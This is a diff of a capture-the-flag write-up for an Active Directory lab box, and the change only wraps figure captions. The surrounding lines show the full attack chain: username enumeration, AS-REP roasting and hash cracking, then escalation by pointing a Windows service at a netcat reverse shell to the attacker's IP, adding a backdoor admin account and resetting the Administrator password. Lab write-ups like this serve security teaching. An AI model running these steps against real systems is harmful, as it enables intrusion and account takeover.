@@ -29,7 +29,7 @@ Standard Nmap scans can be slow. This specific command is tuned for speed and ef
 
 ⚠️ Beginner Tip: While these speed-optimization flags are perfect for CTFs, they are incredibly loud and noisy. In a real-world penetration test, this traffic would immediately alert the target's security team!
 
-Figure 1: Nmap Scan Result
+<ins>Figure 1: Nmap Scan Result</ins>
 
 <img width="632" height="689" alt="image-157" src="https://github.com/user-attachments/assets/77cde6d8-079d-4591-82e0-b686ce46b18b" />
 
@@ -92,13 +92,13 @@ open the webpage and look for usernames
 
 Look closely at the team section and the contact page. By scraping the names listed on the site, we can build our initial list of potential target usernames.
 
-Figure: 2 Website Homepage Footer
+<ins>Figure: 2 Website Homepage Footer</ins>
 
 <img width="1276" height="708" alt="image-158" src="https://github.com/user-attachments/assets/a1fcf713-b93a-44d6-a485-83870fbc56e6" />
 
 `j.smith@services.local` tells us the format a company uses plus a probable username.
 
-Figure 3: Website's About Page
+<ins>Figure 3: Website's About Page</ins>
 
 <img width="1273" height="601" alt="image-159" src="https://github.com/user-attachments/assets/fedc17ad-7bae-4050-ade2-24b99e059382" />
 
@@ -117,7 +117,7 @@ git clone https://github.com/mohinparamasivam/AD-Username-Generator
 cd AD-Username-Generator
 ```
 
-Figure 4: git clone AD-Username-Generator
+<ins>Figure 4: git clone AD-Username-Generator</ins>
 
 <img width="551" height="130" alt="image-160" src="https://github.com/user-attachments/assets/72151dd1-1930-48c9-86ad-c787fcbe2431" />
 
@@ -132,7 +132,7 @@ Now, run the Python script. We pass our raw names file as the input (-u) and spe
 python3 username-generate.py -u unameservices.txt -o servicesadnames.txt
 ```
 
-Figure 5: Results of AD-Username-Generator
+<ins>Figure 5: Results of AD-Username-Generator</ins>
 
 <img width="592" height="681" alt="image-161" src="https://github.com/user-attachments/assets/70a7dba2-a121-4684-861a-7b9397afab13" />
 
@@ -149,13 +149,13 @@ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_
 chmod +x kerbrute_linux_amd64
 ```
 
-Figure 6: Downloading Kerbrute
+<ins>Figure 6: Downloading Kerbrute</ins>
 
 <img width="626" height="605" alt="image-162" src="https://github.com/user-attachments/assets/488b9561-d964-4686-8d21-dd7272bac624" />
 
 Try to run it using - `./kerbrute_linux_amd64`
 
-Figure 7: Run Kerbrute
+<ins>Figure 7: Run Kerbrute</ins>
 
 <img width="625" height="565" alt="image-163" src="https://github.com/user-attachments/assets/236397c0-556e-4444-9890-92f69188b330" />
 
@@ -167,7 +167,7 @@ cp kerbrute_linux_amd64 /usr/bin/kerbrute
 kerbrute -h
 ```
 
-Figure 8: Run Kerbrute from /bin
+<ins>Figure 8: Run Kerbrute from /bin</ins>
 
 <img width="628" height="300" alt="image-164" src="https://github.com/user-attachments/assets/f05aa90b-4d35-463c-a607-ae4c75264064" />
 
@@ -176,7 +176,7 @@ Now we will feed the tool our generated username list (servicesadnames.txt), poi
 kerbrute userenum servicesadnames.txt  --dc 10.114.181.105 -d services.local > generated.txt 
 ```
 
-Figure 9: Run Kerbrute against usernames
+<ins>Figure 9: Run Kerbrute against usernames</ins>
 
 <img width="600" height="266" alt="image-165" src="https://github.com/user-attachments/assets/8b24c51c-b47c-4bb0-a2c7-b30547558a5f" />
 
@@ -195,7 +195,7 @@ Before we move to the attack phase, we need a list containing only the raw usern
 grep "VALID USERNAME:" generated.txt | awk -F' ' '{print $NF}' | cut -d'@' -f1 > clean_users.txt
 ```
 
-Figure 10: clean formatting of usernames found
+<ins>Figure 10: clean formatting of usernames found</ins>
 
 <img width="628" height="146" alt="image-166" src="https://github.com/user-attachments/assets/9b446b3c-d40e-4e6e-8ab7-1baf4133b416" />
 
@@ -211,7 +211,7 @@ We will use Impacket's GetNPUsers tool to check our users and pull down any avai
 impacket-GetNPUsers services.local/ -dc-ip 10.114.181.105 -usersfile clean_users.txt -outputfile hashes.txt
 ```
 
-Figure 11: Asreproasting
+<ins>Figure 11: Asreproasting</ins>
 
 <img width="625" height="209" alt="image-167" src="https://github.com/user-attachments/assets/7cf1ef4e-9b29-4a8b-936d-c69248ea3fa8" />
 
@@ -227,7 +227,7 @@ We will feed the hash file to John and use the `rockyou.txt` wordlist to brute-f
 john --wordlist=/home/kali/rockyou.txt hashes.txt
 ```
 
-Figure 12: Hash Cracking using John The Ripper
+<ins>Figure 12: Hash Cracking using John The Ripper</ins>
 
 <img width="622" height="171" alt="image-168" src="https://github.com/user-attachments/assets/b00e6045-a197-4b60-a5c3-451af73b6c3b" />
 
@@ -246,7 +246,7 @@ impacket-GetUserSPNs -dc-ip 10.114.181.105 'services.local/j.rock:Serviceworks1'
 ```
 Unfortunately, this avenue came up dry, there are no Kerberoasting-susceptible service accounts configured for our current user privilege levels.
 
-Figure 13: Kerberoasting
+<ins>Figure 13: Kerberoasting</ins>
 
 <img width="626" height="98" alt="image-169" src="https://github.com/user-attachments/assets/3532cf09-e3a9-4a3e-a24b-1c748963f79b" />
 
@@ -255,7 +255,7 @@ Okay so first let's check if our credentials give us access to SMB (Port 445), a
 netexec smb 10.114.181.105 -u 'j.rock' -p 'Serviceworks1' --users
 ```
 
-Figure 14: SMB enumerate Users
+<ins>Figure 14: SMB enumerate Users</ins>
 
 <img width="625" height="342" alt="image-170" src="https://github.com/user-attachments/assets/c684f5fc-0a85-4597-a2df-739b3f7f553d" />
 
@@ -266,7 +266,7 @@ While SMB access is great for looking around file shares, what we really want is
 netexec winrm 10.114.181.105 -u 'j.rock' -p 'Serviceworks1'
 ```
 
-Figure 15: WinRM Logon Check
+<ins>Figure 15: WinRM Logon Check</ins>
 
 <img width="626" height="148" alt="image-171" src="https://github.com/user-attachments/assets/f2249c1c-d665-431d-b3cb-8925b3bac53e" />
 
@@ -277,7 +277,7 @@ With confirmation that we can execute remote commands, we use Evil-WinRM to drop
 evil-winrm -u j.rock -p Serviceworks1 -i 10.114.181.105
 ```
 
-Figure 16: Login using Evil-Winrm
+<ins>Figure 16: Login using Evil-Winrm</ins>
 
 <img width="627" height="196" alt="image-172" src="https://github.com/user-attachments/assets/49686a68-a6e4-4a9c-b35f-fb740c118c24" />
 
@@ -287,7 +287,7 @@ We are officially inside the network!
 With our interactive PowerShell session active, our immediate next step is to grab the user flag. The user flag is typically tucked away on the active user's Desktop directory.
 Navigate over to `j.rock`'s Desktop and inside, you will spot a file named user.txt. Read its contents using the type command to capture the first flag!
 
-Figure 17: Capture User Flag
+<ins>Figure 17: Capture User Flag</ins>
 
 <img width="616" height="492" alt="image-173" src="https://github.com/user-attachments/assets/f4f5bcd8-9824-4b59-9d78-f7222f56ddb3" />
 
@@ -297,7 +297,7 @@ Gaining a user shell is only half the battle. Now, we need to escalate our privi
 ### Step 1: Enumerating User Tokens & Groups
 The very first command you should run on any new Windows shell is `whoami /all`. This command reveals your user details, security identifiers (SIDs), the groups you belong to, and your active privileges.
 
-Figure 18: whoami /all
+<ins>Figure 18: whoami /all</ins>
 
 <img width="626" height="632" alt="image-177" src="https://github.com/user-attachments/assets/0ce391c9-048d-4627-8069-7af2a3c4e868" />
 
@@ -307,7 +307,7 @@ Members of the Server Operators group are natively allowed to administer Windows
 
 Let's see which services are running on this machine and check if our current configuration gives us the access permissions needed to manipulate them. We run the `services` command to check our rights.
 
-Figure 19: services
+<ins>Figure 19: services</ins>
 
 <img width="713" height="372" alt="image-178" src="https://github.com/user-attachments/assets/cd193769-a6e0-47a3-98d2-40596bf4b47f" />
 
@@ -323,13 +323,13 @@ cd /usr/share/windows-resources/binaries/
 python3 -m http.server 8000 (run inside the nc.exe containing folder)
 ```
 
-Figure 20: locate and host nc.exe
+<ins>Figure 20: locate and host nc.exe</ins>
 
 <img width="520" height="239" alt="image-179" src="https://github.com/user-attachments/assets/399e71e2-1b13-4e88-a744-6c6b27ea21c9" />
 
 Switching back over to our Evil-WinRM shell on the target machine, we pull down the executable from our Kali IP) and run `dir` right after to verify the transfer succeeded.
 
-Figure 21: Transfer nc.exe
+<ins>Figure 21: Transfer nc.exe</ins>
 
 <img width="685" height="199" alt="image-180" src="https://github.com/user-attachments/assets/cac7fc96-32c4-43e0-817d-6c962c6919c3" />
 
@@ -345,11 +345,11 @@ Now, go back to your Evil-WinRM session and use sc.exe config to modify the serv
 sc.exe config AWSLiteAgent binPath="C:\Users\j.rock\Desktop\nc.exe -e cmd.exe 192.168.250.181 443"
 ```
 
-Figure 22: Modifying Service with sc.exe
+<ins>Figure 22: Modifying Service with sc.exe</ins>
 
 <img width="715" height="52" alt="image-183" src="https://github.com/user-attachments/assets/68e7ec3e-b783-45d1-ba8e-f4836c9f6af3" />
 
-Figure 23: Verify the change by typing 'services'
+<ins>Figure 23: Verify the change by typing 'services'</ins>
 
 <img width="751" height="34" alt="image-186" src="https://github.com/user-attachments/assets/9e03d104-e8fa-468b-9fc5-8562e19ca0a1" />
 
@@ -359,12 +359,12 @@ sc.exe stop AWSLiteAgent
 sc.exe start AWSLiteAgent
 ```
 
-Figure 24: Service Restart
+<ins>Figure 24: Service Restart</ins>
 
 <img width="643" height="89" alt="image-184" src="https://github.com/user-attachments/assets/f96fa159-55ce-49a0-b518-519274b5d4a0" />
 
 
-Figure 25: Got the admin shell
+<ins>Figure 25: Got the admin shell</ins>
 
 <img width="508" height="123" alt="image-181" src="https://github.com/user-attachments/assets/d96a61fc-7c28-42ee-8cea-d82fbf9257a2" />
 
@@ -377,7 +377,7 @@ net user hacker Password123 /add
 net localgroup administrators hacker /add
 ```
 
-Figure 26: Adding new admin user
+<ins>Figure 26: Adding new admin user</ins>
 
 <img width="537" height="208" alt="image-185" src="https://github.com/user-attachments/assets/d022c716-b44b-455b-993d-6c09dcfd77cb" />
 
@@ -386,7 +386,7 @@ With our custom hacker account successfully added to the local Administrators gr
 evil-winrm -i 10.114.181.105 -u 'hacker' -p 'Password123!'
 ```
 
-Figure 27: Shell with new admin user
+<ins>Figure 27: Shell with new admin user</ins>
 
 <img width="853" height="229" alt="image-182" src="https://github.com/user-attachments/assets/7b217e68-189b-428d-a5e3-38bf4e5c6563" />
 
@@ -399,7 +399,7 @@ To bypass this, we trigger our temporary 30-second netcat shell one more time to
 net localgroup "Remote Management Users" hacker /add
 ```
 
-Figure 28: add new user to Remote Management Users group
+<ins>Figure 28: add new user to Remote Management Users group</ins>
 
 <img width="552" height="167" alt="image-187" src="https://github.com/user-attachments/assets/d6c57552-a38e-4116-8eba-079c872d0b8f" />
 
@@ -410,7 +410,7 @@ Instead of playing cat-and-mouse with custom user permissions inside a restricte
 net user Administrator NewAdminPassword123!
 ```
 
- Figure 29: reset main administrator password
+ <ins>Figure 29: reset main administrator password</ins>
 
 <img width="546" height="173" alt="image-188" src="https://github.com/user-attachments/assets/86ce3c47-1001-4f65-832d-1ef932c284c6" />
 
@@ -420,7 +420,7 @@ Bash
 evil-winrm -i 10.114.181.105 -u 'Administrator' -p 'NewAdminPassword123!'
 ```
 
-Figure 30: Login as Administrator
+<ins>Figure 30: Login as Administrator</ins>
 
 <img width="842" height="165" alt="image-189" src="https://github.com/user-attachments/assets/36ec6590-78e5-4e9c-a006-061cdb51b3cd" />
 
@@ -433,7 +433,7 @@ dir
 type root.txt
 ```
 
-Figure 31: Capture the root flag
+<ins>Figure 31: Capture the root flag</ins>
 
 <img width="638" height="237" alt="image-190" src="https://github.com/user-attachments/assets/0b2cb6a6-f76e-4792-93f4-616fbef0acdc" />
 
